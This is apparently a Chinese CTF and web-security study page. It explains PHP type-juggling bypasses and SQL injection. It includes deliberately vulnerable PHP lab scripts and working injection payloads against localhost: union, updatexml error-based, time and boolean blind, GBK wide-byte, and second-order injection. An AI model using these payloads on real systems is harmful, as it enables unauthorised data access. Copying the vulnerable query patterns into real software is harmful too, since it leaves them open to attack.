+<h4 id="strcmp漏洞绕过-php-v-lt-5-3"><a href="#strcmp漏洞绕过-php-v-lt-5-3" class="headerlink" title="strcmp漏洞绕过 php -v &lt;5.3"></a>strcmp漏洞绕过 php -v &lt;5.3</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=<span class="string">"***************"</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Right!!!login success"</span>;n</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wrong password.."</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>strcmp是比较两个字符串，如果str1&lt;str2 则返回&lt;0 如果str1大于str2返回&gt;0 如果两者相等 返回0</li>
+<li>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</li>
+<li>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</li>
+<li>payload: password[]=xxx</li>
+</ul>
+<h4 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"4admin"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($a) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail1"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail2"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail3"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sucess"</span>;  <span class="comment">//结果输出success;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"failall"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>原理和上面一样</p>
+<h4 id="is-numeric（）、int-强制类型转换"><a href="#is-numeric（）、int-强制类型转换" class="headerlink" title="is_numeric（）、int()强制类型转换"></a>is_numeric（）、int()强制类型转换</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$flag = <span class="string">"xxxx"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123; </span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123; </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123; </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                sleep((int)$_GET[<span class="string">'time'</span>]); </span><br><span class="line">                <span class="keyword">echo</span> $flag; </span><br><span class="line">        &#125; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>知识点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int()，不能正确转换的类型有十六进制型字符串、科学计数法型字符串</span><br><span class="line">is_numeric()支持普通数字型字符串、科学记数法型字符串、部分支持十六进制0x型字符串</span><br></pre></td></tr></table></figure>
+
+<p>先判断是不是数字，然后再进行int长短的限定判断，也就是只能限定在5184000L&lt;  time &lt;  7776000</p>
+<p>通过is_number() 能传入科学计数法，来进行绕过。</p>
+<p>所以根据int不能处理科学计数法，而在is_number上能处理来解决。</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>按照参数类型分类，按数据库返回的结果分类等。</p>
+<h5 id="按照参数类型分类"><a href="#按照参数类型分类" class="headerlink" title="按照参数类型分类"></a>按照参数类型分类</h5><p>按照参数类型可以分为两类:数值型、字符型</p>
+<p>简单来说，就是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数字型注入</span><br><span class="line">加单引号 错误出异常</span><br><span class="line">and 1 = 1 正常</span><br><span class="line">and 1 = 2 异常</span><br><span class="line"></span><br><span class="line">字符型注入</span><br><span class="line">加单引号 错误出异常</span><br><span class="line">and '1' = '1 正常</span><br><span class="line">and '1' = '2 异常</span><br></pre></td></tr></table></figure>
+
+<h5 id="数值型"><a href="#数值型" class="headerlink" title="数值型"></a>数值型</h5><p>程序拼接的变量值没有被引号包裹。数值型注入是无视php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义函数的影响的。如果程序没有对关键字或者特殊符号过滤或者过滤不严(比如没有过滤union、select等关键字,可以使用联合注入,过滤了union、select等关键字,可以用盲注或者报错注入等方法)</p>
+<p>eg:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS &#96;test&#96;;</span><br><span class="line">CREATE TABLE IF NOT EXISTS &#96;news&#96; (</span><br><span class="line">  &#96;tid&#96; int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;title&#96; varchar(30) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  &#96;content&#96; varchar(256) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;tid&#96;)</span><br><span class="line">) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8 AUTO_INCREMENT&#x3D;3 ;</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;news&#96; (&#96;tid&#96;, &#96;title&#96;, &#96;content&#96;) VALUES</span><br><span class="line">(1, &#39;新闻1&#39;, &#39;这是第一篇文章&#39;),</span><br><span class="line">(2, &#39;新闻2&#39;, &#39;这是第二篇文章&#39;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>sqlinjection.php(test on mysql 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])&amp;&amp;$_GET[<span class="string">'id'</span>])&#123;</span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $sql = <span class="string">"select * from news where id=$id"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM news"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); <span class="comment">//sql出错会报错，方便观察</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">    <span class="keyword">while</span>($row = mysql_fetch_row($result, MYSQL_ASSOC))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;$row['tid']&#125;    &#123;$row['title']&#125;    &#123;$row['content']&#125;&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection.php?id&#x3D;1 union select 1,2,user() --</span><br></pre></td></tr></table></figure>
+
+<p>没有回显可以尝试下看能不能报错注入,比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection.php?id&#x3D;1 or updatexml(2,concat(0x7e,(version())),0) --</span><br></pre></td></tr></table></figure>
+
+<p>也可以试下时间盲注,比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection.php?id&#x3D;3 and sleep(3) --</span><br></pre></td></tr></table></figure>
+
+<p>也可以试下bool盲注(看能不能引起页面变化):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlinjection.php?id&#x3D;3 and (length(database()))&gt;10 --</span><br></pre></td></tr></table></figure>
+
+<p><strong>注</strong>: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)。</p>
+<p><strong>注</strong>: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。</p>
+<h5 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h5><p>程序拼接的变量被引号包裹。字符型注入是是受php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义的函数影响的。如果程序没有对引号和关键字或者特殊符号过滤或者过滤不严,可能会导致sql注入。</p>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$p = $_GET[<span class="string">'p'</span>]; p = <span class="number">100</span><span class="string">' and '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br><span class="line">$sql = <span class="string">"select * from news where p = '3' and '1'='2'"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>闭合单引号,如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;qqq.php?p&#x3D;1&#39; union select 1,2,user() --</span><br></pre></td></tr></table></figure>
+
+<p>闭合单引号,没有回显可以尝试下看能不能报错注入,比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;qqq.php?p&#x3D;1&#39; or updatexml(2,concat(0x7e,(version())),0) --</span><br></pre></td></tr></table></figure>
+
+<p>也可以试下时间盲注,比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;qqq.php?p&#x3D;1&#39; and sleep(5) --</span><br></pre></td></tr></table></figure>
+
+<p>也可以试下bool盲注(看能不能引起页面变化):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx&#x2F;qqq.php?p&#x3D;1&#39; and (length(database()))&gt;10 --</span><br></pre></td></tr></table></figure>
+
+<p><strong>注</strong>: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)</p>
+<p><strong>注</strong>: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。</p>
+<h5 id="按数据库返回的结果分类"><a href="#按数据库返回的结果分类" class="headerlink" title="按数据库返回的结果分类"></a>按数据库返回的结果分类</h5><p>据数据库返回的结果,分为回显注入、报错注入、盲注。</p>
+<h5 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h5><p>可以直接在存在注入点的当前页面中获取返回结果,可以使用回显注入。</p>
+<p>常见利用:</p>
+<blockquote>
+<p>union select</p>
+</blockquote>
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>程序将数据库的返回错误信息直接显示在页面中。虽然没有返回数据库的查询结果,但是可以构造一些报错语句从错误信息中获取想要的结果。</p>
+<p>常见利用:</p>
+<blockquote>
+<p>floor<br>updatexml<br>extractvalue</p>
+</blockquote>
+<h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。</p>
+<ul>
+<li>bool盲注(based boolean)<ul>
+<li>如果测试时发现页面有变化,可以尝试使用bool盲注</li>
+</ul>
+</li>
+<li>时间盲注(based time)<ul>
+<li>如果测试时页面无变化,但是通过sleep发现页面存在延迟,可以尝试使用时间盲注</li>
+</ul>
+</li>
+</ul>
+<p>利用:</p>
+<ul>
+<li>Length()、Substr()、Ascii()、sleep()、if(expr1,expr2,expr3)等结合使用</li>
+</ul>
+<h5 id="其他特殊注入"><a href="#其他特殊注入" class="headerlink" title="其他特殊注入"></a>其他特殊注入</h5><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>形成条件:</p>
+<ul>
+<li>开启了<code>gpc</code>或使用<code>addslashes</code>、<code>mysql_real_escape_string</code>、<code>mysql_escape_string</code>等对引号转义的函数</li>
+<li>使用了<code>SET NAMES 多字节编码</code>或者<code>set character_set_client=多字节编码</code>指令,这里多字节编码低位的范围需要覆盖0x5C才能导致注入。我们最常见的是<code>gbk</code>编码。</li>
+</ul>
+<p>假如代码中设置的是GBK编码(mysql那端表或者字段设置的编码无影响,会自动转换),这时只要引入宽字节高位编码吃掉<code>\</code>(%5c),就导致了宽字节注入的发生。</p>
+<p>可以参考<a href="https://lyiang.wordpress.com/2015/06/09/sql注入：宽字节注入（gbk双字节绕过）/" target="_blank" rel="noopener">sql注入：宽字节注入(gbk双字节绕过)</a></p>
+<p>eg:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS &#96;test&#96;;</span><br><span class="line">CREATE TABLE IF NOT EXISTS &#96;news&#96; (</span><br><span class="line">  &#96;tid&#96; int(10) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;title&#96; varchar(30) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  &#96;content&#96; varchar(256) CHARACTER SET utf8 NOT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;tid&#96;)</span><br><span class="line">) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8 AUTO_INCREMENT&#x3D;3 ;</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;news&#96; (&#96;tid&#96;, &#96;title&#96;, &#96;content&#96;) VALUES</span><br><span class="line">(1, &#39;新闻1&#39;, &#39;这是第一篇文章&#39;),</span><br><span class="line">(2, &#39;新闻2&#39;, &#39;这是第二篇文章&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>sqlgbkinjection.php (test on mysql 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去</span></span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line"><span class="comment">//执行sql语句</span></span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</span><br><span class="line">$result = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error()); <span class="comment">//sql出错会报错，方便观察</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span> /&gt;</span><br><span class="line">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2&gt;&#123;$row['title']&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row['content']&#125;&lt;p&gt;\n"</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试:<br><code>http://127.0.0.1/sqlgbkinjection.php?id=10%df%27%20union%20select%201,user(),database()%23</code></p>
+<h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>首先将构造好的利用代码写入网站保存,再第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞。</p>
+<p>比如sql二次注入:</p>
+<p>在第一次进行数据库插入数据的时候，仅仅只是使用了<code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p>
+<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
+<p>eg:<br>数据表使用的是上面news表</p>
+<p>secondaryinjection.php (test on mysql 5.5.38)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$conn = mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>, $conn) <span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'tid'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]))&#123;</span><br><span class="line">    $tid = intval($_GET[<span class="string">'tid'</span>]);</span><br><span class="line">    $title = $_GET[<span class="string">'title'</span>];</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!get_magic_quotes_gpc())&#123;</span><br><span class="line">        $title = addslashes($title);</span><br><span class="line">        $content = addslashes($_GET[<span class="string">'content'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"INSERT INTO news(tid,title,content) VALUES ($tid,'$title','$content')"</span>;</span><br><span class="line">    mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from news where tid=$tid"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    $results = mysql_query($sql,$conn);</span><br><span class="line">    $row = mysql_fetch_array($results);</span><br><span class="line">    $_SESSION[<span class="string">'tid'</span>] = $row[<span class="string">'tid'</span>];</span><br><span class="line">    $_SESSION[<span class="string">'title'</span>] = $row[<span class="string">'title'</span>];</span><br><span class="line">    <span class="keyword">echo</span> $_SESSION[<span class="string">'title'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'title'</span>]))&#123;</span><br><span class="line">    $title = $_SESSION[<span class="string">'title'</span>];</span><br><span class="line">    $sql = <span class="string">"select * from news where title='$title'"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $sql.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    $results = mysql_query($sql, $conn) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_array($results))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $row[<span class="string">'title'</span>].<span class="string">'    '</span>.$row[<span class="string">'content'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Try create a new'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/secondaryinjection.php?tid=6&amp;title=aaa%27 union select 1,user(),3%23&amp;content=qqqqq</code></p>
+<p><code>http://127.0.0.1/secondaryinjection.php</code></p>
+<h4 id="检测判断sql注入："><a href="#检测判断sql注入：" class="headerlink" title="检测判断sql注入："></a>检测判断sql注入：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1' and 1=0 //报错</span><br><span class="line">id=1' and 1=1 //正确</span><br></pre></td></tr></table></figure>
+
+<h4 id="判断什么类型注入："><a href="#判断什么类型注入：" class="headerlink" title="判断什么类型注入："></a>判断什么类型注入：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1'</span><br><span class="line">id=1"</span><br></pre></td></tr></table></figure>
+
+<p>可加 “\” 等符号，构造报错，从报错回显中观察是什么类型的错误，如：</p>
